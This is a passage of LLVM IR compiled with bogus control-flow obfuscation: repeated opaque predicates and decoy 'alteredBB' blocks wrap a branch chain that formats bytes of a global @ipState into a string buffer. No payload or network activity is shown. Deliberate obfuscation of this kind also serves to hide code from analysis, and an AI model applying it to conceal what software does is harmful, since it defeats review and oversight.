  %145 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %146 = zext i8 %145 to i32
  %147 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %148 = zext i8 %147 to i32
  %149 = call i32 (i8*, i8*, ...) @szprintf(i8* %144, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.48, i32 0, i32 0), i32 %146, i32 %148)
  br label %150

; <label>:150:                                    ; preds = %143, %140
  %151 = load i32, i32* @x.75
  %152 = load i32, i32* @y.76
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %150
  %159 = load i32, i32* %1, align 4
  %160 = icmp eq i32 %159, 7
  %161 = load i32, i32* @x.75
  %162 = load i32, i32* @y.76
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %160, label %169, label %176

; <label>:169:                                    ; preds = %originalBBpart216
  %170 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %171 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %172 = zext i8 %171 to i32
  %173 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %174 = zext i8 %173 to i32
  %175 = call i32 (i8*, i8*, ...) @szprintf(i8* %170, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.49, i32 0, i32 0), i32 %172, i32 %174)
  br label %176

; <label>:176:                                    ; preds = %169, %originalBBpart216
  %177 = load i32, i32* %1, align 4
  %178 = icmp eq i32 %177, 8
  br i1 %178, label %179, label %202

; <label>:179:                                    ; preds = %176
  %180 = load i32, i32* @x.75
  %181 = load i32, i32* @y.76
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %179
  %188 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %189 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %190 = zext i8 %189 to i32
  %191 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %192 = zext i8 %191 to i32
  %193 = call i32 (i8*, i8*, ...) @szprintf(i8* %188, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.50, i32 0, i32 0), i32 %190, i32 %192)
  %194 = load i32, i32* @x.75
  %195 = load i32, i32* @y.76
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %202

; <label>:202:                                    ; preds = %originalBBpart220, %176
  %203 = load i32, i32* %1, align 4
  %204 = icmp eq i32 %203, 9
  br i1 %204, label %205, label %212

; <label>:205:                                    ; preds = %202
  %206 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %207 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %208 = zext i8 %207 to i32
  %209 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %210 = zext i8 %209 to i32
  %211 = call i32 (i8*, i8*, ...) @szprintf(i8* %206, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.51, i32 0, i32 0), i32 %208, i32 %210)
  br label %212

; <label>:212:                                    ; preds = %205, %202
  %213 = load i32, i32* %1, align 4
  %214 = icmp eq i32 %213, 10
  br i1 %214, label %215, label %222

; <label>:215:                                    ; preds = %212
  %216 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %217 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %218 = zext i8 %217 to i32
  %219 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %220 = zext i8 %219 to i32
  %221 = call i32 (i8*, i8*, ...) @szprintf(i8* %216, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.52, i32 0, i32 0), i32 %218, i32 %220)
  br label %222

; <label>:222:                                    ; preds = %215, %212
  %223 = load i32, i32* @x.75
  %224 = load i32, i32* @y.76
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %222
  %231 = load i32, i32* %1, align 4
  %232 = icmp eq i32 %231, 11
  %233 = load i32, i32* @x.75
  %234 = load i32, i32* @y.76
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %232, label %241, label %264

; <label>:241:                                    ; preds = %originalBBpart224
  %242 = load i32, i32* @x.75
  %243 = load i32, i32* @y.76
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %241
  %250 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %251 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %252 = zext i8 %251 to i32
  %253 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %254 = zext i8 %253 to i32
  %255 = call i32 (i8*, i8*, ...) @szprintf(i8* %250, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.53, i32 0, i32 0), i32 %252, i32 %254)
  %256 = load i32, i32* @x.75
  %257 = load i32, i32* @y.76
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %264

; <label>:264:                                    ; preds = %originalBBpart228, %originalBBpart224
  %265 = load i32, i32* %1, align 4
  %266 = icmp eq i32 %265, 12
  br i1 %266, label %267, label %290

; <label>:267:                                    ; preds = %264
  %268 = load i32, i32* @x.75
  %269 = load i32, i32* @y.76
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %267
  %276 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %277 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %278 = zext i8 %277 to i32
  %279 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %280 = zext i8 %279 to i32
  %281 = call i32 (i8*, i8*, ...) @szprintf(i8* %276, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.54, i32 0, i32 0), i32 %278, i32 %280)
  %282 = load i32, i32* @x.75
  %283 = load i32, i32* @y.76
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %290

; <label>:290:                                    ; preds = %originalBBpart232, %264
  %291 = load i32, i32* %1, align 4
  %292 = icmp eq i32 %291, 13
  br i1 %292, label %293, label %316

; <label>:293:                                    ; preds = %290
  %294 = load i32, i32* @x.75
  %295 = load i32, i32* @y.76
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %293
  %302 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %303 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %304 = zext i8 %303 to i32
  %305 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %306 = zext i8 %305 to i32
  %307 = call i32 (i8*, i8*, ...) @szprintf(i8* %302, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.55, i32 0, i32 0), i32 %304, i32 %306)
  %308 = load i32, i32* @x.75
  %309 = load i32, i32* @y.76
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %316

; <label>:316:                                    ; preds = %originalBBpart236, %290
  %317 = load i32, i32* %1, align 4
  %318 = icmp eq i32 %317, 14
  br i1 %318, label %319, label %326

; <label>:319:                                    ; preds = %316
  %320 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %321 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %322 = zext i8 %321 to i32
  %323 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %324 = zext i8 %323 to i32
  %325 = call i32 (i8*, i8*, ...) @szprintf(i8* %320, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.56, i32 0, i32 0), i32 %322, i32 %324)
  br label %326

; <label>:326:                                    ; preds = %319, %316
  %327 = load i32, i32* @x.75
  %328 = load i32, i32* @y.76
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %326
  %335 = load i32, i32* %1, align 4
  %336 = icmp eq i32 %335, 15
  %337 = load i32, i32* @x.75
  %338 = load i32, i32* @y.76
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %336, label %345, label %352

; <label>:345:                                    ; preds = %originalBBpart240
  %346 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %347 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %348 = zext i8 %347 to i32
  %349 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %350 = zext i8 %349 to i32
  %351 = call i32 (i8*, i8*, ...) @szprintf(i8* %346, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.57, i32 0, i32 0), i32 %348, i32 %350)
  br label %352

; <label>:352:                                    ; preds = %345, %originalBBpart240
  %353 = load i32, i32* @x.75
  %354 = load i32, i32* @y.76
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %352
  %361 = load i32, i32* %1, align 4
  %362 = icmp eq i32 %361, 16
  %363 = load i32, i32* @x.75
  %364 = load i32, i32* @y.76
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %362, label %371, label %378

; <label>:371:                                    ; preds = %originalBBpart244
  %372 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %373 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %374 = zext i8 %373 to i32
  %375 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %376 = zext i8 %375 to i32
  %377 = call i32 (i8*, i8*, ...) @szprintf(i8* %372, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.58, i32 0, i32 0), i32 %374, i32 %376)
  br label %378

; <label>:378:                                    ; preds = %371, %originalBBpart244
  %379 = load i32, i32* %1, align 4
  %380 = icmp eq i32 %379, 17
  br i1 %380, label %381, label %388

; <label>:381:                                    ; preds = %378
  %382 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %383 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %384 = zext i8 %383 to i32
  %385 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %386 = zext i8 %385 to i32
  %387 = call i32 (i8*, i8*, ...) @szprintf(i8* %382, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.59, i32 0, i32 0), i32 %384, i32 %386)
  br label %388

; <label>:388:                                    ; preds = %381, %378
  %389 = load i32, i32* @x.75
  %390 = load i32, i32* @y.76
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %388
  %397 = load i32, i32* %1, align 4
  %398 = icmp eq i32 %397, 18
  %399 = load i32, i32* @x.75
  %400 = load i32, i32* @y.76
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %398, label %407, label %414

; <label>:407:                                    ; preds = %originalBBpart248
  %408 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %409 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %410 = zext i8 %409 to i32
  %411 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %412 = zext i8 %411 to i32
  %413 = call i32 (i8*, i8*, ...) @szprintf(i8* %408, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.60, i32 0, i32 0), i32 %410, i32 %412)
  br label %414

; <label>:414:                                    ; preds = %407, %originalBBpart248
  %415 = load i32, i32* @x.75
  %416 = load i32, i32* @y.76
  %417 = sub i32 %415, 1
  %418 = mul i32 %415, %417
  %419 = urem i32 %418, 2
  %420 = icmp eq i32 %419, 0
  %421 = icmp slt i32 %416, 10
  %422 = or i1 %420, %421
  br i1 %422, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %414
  %423 = load i32, i32* %1, align 4
  %424 = icmp eq i32 %423, 19
  %425 = load i32, i32* @x.75
  %426 = load i32, i32* @y.76
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %424, label %433, label %440

; <label>:433:                                    ; preds = %originalBBpart252
  %434 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %435 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %436 = zext i8 %435 to i32
  %437 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %438 = zext i8 %437 to i32
  %439 = call i32 (i8*, i8*, ...) @szprintf(i8* %434, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.61, i32 0, i32 0), i32 %436, i32 %438)
  br label %440

; <label>:440:                                    ; preds = %433, %originalBBpart252
  %441 = load i32, i32* %1, align 4
  %442 = icmp eq i32 %441, 20
  br i1 %442, label %443, label %466

; <label>:443:                                    ; preds = %440
  %444 = load i32, i32* @x.75
  %445 = load i32, i32* @y.76
  %446 = sub i32 %444, 1
  %447 = mul i32 %444, %446
  %448 = urem i32 %447, 2
  %449 = icmp eq i32 %448, 0
  %450 = icmp slt i32 %445, 10
  %451 = or i1 %449, %450
  br i1 %451, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %443
  %452 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %453 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %454 = zext i8 %453 to i32
  %455 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %456 = zext i8 %455 to i32
  %457 = call i32 (i8*, i8*, ...) @szprintf(i8* %452, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.62, i32 0, i32 0), i32 %454, i32 %456)
  %458 = load i32, i32* @x.75
  %459 = load i32, i32* @y.76
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %466

; <label>:466:                                    ; preds = %originalBBpart256, %440
  %467 = load i32, i32* %1, align 4
  %468 = icmp eq i32 %467, 21
  br i1 %468, label %469, label %492

; <label>:469:                                    ; preds = %466
  %470 = load i32, i32* @x.75
  %471 = load i32, i32* @y.76
  %472 = sub i32 %470, 1
  %473 = mul i32 %470, %472
  %474 = urem i32 %473, 2
  %475 = icmp eq i32 %474, 0
  %476 = icmp slt i32 %471, 10
  %477 = or i1 %475, %476
  br i1 %477, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %469
  %478 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %479 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %480 = zext i8 %479 to i32
  %481 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %482 = zext i8 %481 to i32
  %483 = call i32 (i8*, i8*, ...) @szprintf(i8* %478, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.63, i32 0, i32 0), i32 %480, i32 %482)
  %484 = load i32, i32* @x.75
  %485 = load i32, i32* @y.76
  %486 = sub i32 %484, 1
  %487 = mul i32 %484, %486
  %488 = urem i32 %487, 2
  %489 = icmp eq i32 %488, 0
  %490 = icmp slt i32 %485, 10
  %491 = or i1 %489, %490
  br i1 %491, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %492

; <label>:492:                                    ; preds = %originalBBpart260, %466
  %493 = load i32, i32* %1, align 4
  %494 = icmp eq i32 %493, 22
  br i1 %494, label %495, label %502

; <label>:495:                                    ; preds = %492
  %496 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %497 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %498 = zext i8 %497 to i32
  %499 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %500 = zext i8 %499 to i32
  %501 = call i32 (i8*, i8*, ...) @szprintf(i8* %496, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.64, i32 0, i32 0), i32 %498, i32 %500)
  br label %502

; <label>:502:                                    ; preds = %495, %492
  %503 = load i32, i32* %1, align 4
  %504 = icmp eq i32 %503, 23
  br i1 %504, label %505, label %528

; <label>:505:                                    ; preds = %502
  %506 = load i32, i32* @x.75
  %507 = load i32, i32* @y.76
  %508 = sub i32 %506, 1
  %509 = mul i32 %506, %508
  %510 = urem i32 %509, 2
  %511 = icmp eq i32 %510, 0
  %512 = icmp slt i32 %507, 10
  %513 = or i1 %511, %512
  br i1 %513, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %505
  %514 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %515 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %516 = zext i8 %515 to i32
  %517 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %518 = zext i8 %517 to i32
  %519 = call i32 (i8*, i8*, ...) @szprintf(i8* %514, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.65, i32 0, i32 0), i32 %516, i32 %518)
  %520 = load i32, i32* @x.75
  %521 = load i32, i32* @y.76
  %522 = sub i32 %520, 1
  %523 = mul i32 %520, %522
  %524 = urem i32 %523, 2
  %525 = icmp eq i32 %524, 0
  %526 = icmp slt i32 %521, 10
  %527 = or i1 %525, %526
  br i1 %527, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %528

; <label>:528:                                    ; preds = %originalBBpart264, %502
  %529 = load i32, i32* %1, align 4
  %530 = icmp eq i32 %529, 24
  br i1 %530, label %531, label %538

; <label>:531:                                    ; preds = %528
  %532 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %533 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %534 = zext i8 %533 to i32
  %535 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %536 = zext i8 %535 to i32
  %537 = call i32 (i8*, i8*, ...) @szprintf(i8* %532, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i32 0, i32 0), i32 %534, i32 %536)
  br label %538

; <label>:538:                                    ; preds = %531, %528
  %539 = load i32, i32* %1, align 4
  %540 = icmp eq i32 %539, 25
  br i1 %540, label %541, label %548

; <label>:541:                                    ; preds = %538
  %542 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %543 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %544 = zext i8 %543 to i32
  %545 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %546 = zext i8 %545 to i32
  %547 = call i32 (i8*, i8*, ...) @szprintf(i8* %542, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.67, i32 0, i32 0), i32 %544, i32 %546)
  br label %548

; <label>:548:                                    ; preds = %541, %538
  %549 = load i32, i32* %1, align 4
  %550 = icmp eq i32 %549, 26
  br i1 %550, label %551, label %558

; <label>:551:                                    ; preds = %548
  %552 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %553 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %554 = zext i8 %553 to i32
  %555 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %556 = zext i8 %555 to i32
  %557 = call i32 (i8*, i8*, ...) @szprintf(i8* %552, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i32 0, i32 0), i32 %554, i32 %556)
  br label %558

; <label>:558:                                    ; preds = %551, %548
  %559 = load i32, i32* @x.75
  %560 = load i32, i32* @y.76
  %561 = sub i32 %559, 1
  %562 = mul i32 %559, %561
  %563 = urem i32 %562, 2
  %564 = icmp eq i32 %563, 0
  %565 = icmp slt i32 %560, 10
  %566 = or i1 %564, %565
  br i1 %566, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %558
  %567 = load i32, i32* %1, align 4
  %568 = icmp eq i32 %567, 27
  %569 = load i32, i32* @x.75
  %570 = load i32, i32* @y.76
  %571 = sub i32 %569, 1
  %572 = mul i32 %569, %571
  %573 = urem i32 %572, 2
  %574 = icmp eq i32 %573, 0
  %575 = icmp slt i32 %570, 10
  %576 = or i1 %574, %575
  br i1 %576, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %568, label %577, label %584

; <label>:577:                                    ; preds = %originalBBpart268
  %578 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %579 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %580 = zext i8 %579 to i32
  %581 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %582 = zext i8 %581 to i32
  %583 = call i32 (i8*, i8*, ...) @szprintf(i8* %578, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0), i32 %580, i32 %582)
  br label %584

; <label>:584:                                    ; preds = %577, %originalBBpart268
  %585 = load i32, i32* %1, align 4
  %586 = icmp eq i32 %585, 28
  br i1 %586, label %587, label %594

; <label>:587:                                    ; preds = %584
  %588 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %589 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %590 = zext i8 %589 to i32
  %591 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %592 = zext i8 %591 to i32
  %593 = call i32 (i8*, i8*, ...) @szprintf(i8* %588, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i32 %590, i32 %592)
  br label %594

; <label>:594:                                    ; preds = %587, %584
  %595 = load i32, i32* %1, align 4
  %596 = icmp eq i32 %595, 29
  br i1 %596, label %597, label %620

; <label>:597:                                    ; preds = %594
  %598 = load i32, i32* @x.75
  %599 = load i32, i32* @y.76
  %600 = sub i32 %598, 1
  %601 = mul i32 %598, %600
  %602 = urem i32 %601, 2
  %603 = icmp eq i32 %602, 0
  %604 = icmp slt i32 %599, 10
  %605 = or i1 %603, %604
  br i1 %605, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %597
  %606 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %607 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %608 = zext i8 %607 to i32
  %609 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %610 = zext i8 %609 to i32
  %611 = call i32 (i8*, i8*, ...) @szprintf(i8* %606, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.70, i32 0, i32 0), i32 %608, i32 %610)
  %612 = load i32, i32* @x.75
  %613 = load i32, i32* @y.76
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %620

; <label>:620:                                    ; preds = %originalBBpart272, %594
  %621 = load i32, i32* %1, align 4
  %622 = icmp eq i32 %621, 30
  br i1 %622, label %623, label %646

; <label>:623:                                    ; preds = %620
  %624 = load i32, i32* @x.75
  %625 = load i32, i32* @y.76
  %626 = sub i32 %624, 1
  %627 = mul i32 %624, %626
  %628 = urem i32 %627, 2
  %629 = icmp eq i32 %628, 0
  %630 = icmp slt i32 %625, 10
  %631 = or i1 %629, %630
